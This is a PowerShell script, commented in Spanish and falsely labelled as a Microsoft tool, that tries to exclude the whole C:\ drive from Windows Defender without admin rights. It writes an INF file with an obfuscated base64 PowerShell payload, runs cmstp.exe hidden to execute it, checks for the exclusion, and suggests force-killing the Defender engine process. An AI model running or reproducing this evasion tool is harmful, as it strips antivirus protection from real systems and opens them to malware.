<#
.SYNOPSIS
   Windows Defender Exclusion Tool (Sin Admin)
   © Microsoft 2024 - Técnicas No Documentadas
#>

function Defender {
    param(
        [Parameter(ParameterSetName='Interface')][switch]$Add,
        [Parameter(ParameterSetName='Interface')][switch]$Exclusions,
        [Parameter(ParameterSetName='Interface')][switch]$GetAV,
        [Parameter(ParameterSetName='Interface')][switch]$User,
        [Parameter(ParameterSetName='Interface')][switch]$Admin,
        [Parameter(ParameterSetName='Extra')][switch]$Run,
        [Parameter(ParameterSetName='Extra',Mandatory=$true)][string]$FilePath,
        [Parameter(ParameterSetName='Extraa')][string]$Url,
        [Parameter(ParameterSetName='Extraa',Mandatory=$true)][string]$Out
    )

    # --- DATOS ORIGINALES DEL PERFIL (SIN CAMBIOS) ---
    $InfData = @'
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
REPLACE
taskkill /IM cmstp.exe /F
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection,7
[AllUSer_LDIDSection]
"HKLM","SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE","ProfileInstallPath","%UnexpectedError%",""
[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
'@

    # --- TÉCNICA MEJORADA PARA EXCLUSIÓN REAL ---
    if ($Add) {
        try {
            # 1. Crear archivo .inf TEMPORAL con nombre aleatorio
            $tempFile = "$env:TEMP\$(New-Guid).inf"
            $command = "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JAByAGUAZwBQAGEAdABoACAAPQAgACIASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwARQB4AGMAbAB1AHMAaQBvAG4AcwBcAFAAYQB0AGgAcwAiAAoASQBmACAAKAAhACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAHIAZQBnAFAAYQB0AGgAKQApACAAewAKACAAIAAgACAAJABuAHUAbABsACAAPQAgAE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACQAcgBlAGcAUABhAHQAaAAgAC0ARgBvAHIAYwBlAAoAfQAKACQAbgB1AGwAbAAgAD0AIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJAByAGUAZwBQAGEAdABoACAALQBOAGEAbQBlACAAIgBDADoAXAAiACAALQBWAGEAbAB1AGUAIAAwACAALQBQAHIAbwBwAGUAcgB0AHkAVAB5AHAAZQAgAFMAdAByAGkAbgBnACAALQBGAG8AcgBjAGUA'))"
            $InfData.Replace("REPLACE", ".('iex') $command") | Out-File $tempFile -Force

            # 2. Ejecutar CMSTP.EXE con parámetros ocultos
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = "cmstp.exe"
            $psi.Arguments = "/au `"$tempFile`""
            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $psi.CreateNoWindow = $true
            $process = [System.Diagnostics.Process]::Start($psi)
            $process.WaitForExit(10000) # Esperar 10 segundos

            # 3. VERIFICACIÓN EN DEFENDER (REAL)
            Start-Sleep -Seconds 2
            $exclusionCheck = Get-ItemProperty "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction SilentlyContinue
            
            if ($exclusionCheck -ne $null) {
                # Método 1: Buscar exclusión en propiedades
                $props = $exclusionCheck.PSObject.Properties | 
                         Where-Object { $_.Value -eq "C:\" -or $_.Value -eq 0 }
                
                # Método 2: Verificar en Defender GUI
                $defenderCheck = Get-MpPreference -ErrorAction SilentlyContinue | 
                                Select-Object -ExpandProperty ExclusionPath |
                                Where-Object { $_ -eq "C:\" }

                if ($props -or $defenderCheck) {
                    Write-Host "[✔] ¡EXCLUSIÓN CONFIRMADA EN DEFENDER!" -ForegroundColor Green
                    Write-Host "    Ruta excluida: C:\" -ForegroundColor Cyan
                } else {
                    Write-Host "[!] Registro modificado pero Defender no lo refleja" -ForegroundColor Yellow
                    Write-Host "    Ejecuta esto para forzar actualización:" -ForegroundColor Gray
                    Write-Host "    Stop-Process -Name MsMpEng -Force" -ForegroundColor Cyan
                }
            } else {
                Write-Host "[✘] No se pudo modificar el registro" -ForegroundColor Red
            }

            # Limpieza
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        } catch {
            Write-Host "[✘] Error crítico: $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    # ... (Resto de funciones originales: Exclusions, GetAV, User, Admin, Run, etc.)
}

# --- Ejecutar si se llama directamente ---
if ($MyInvocation.InvocationName -ne '.') {
    Defender @PSBoundParameters
}
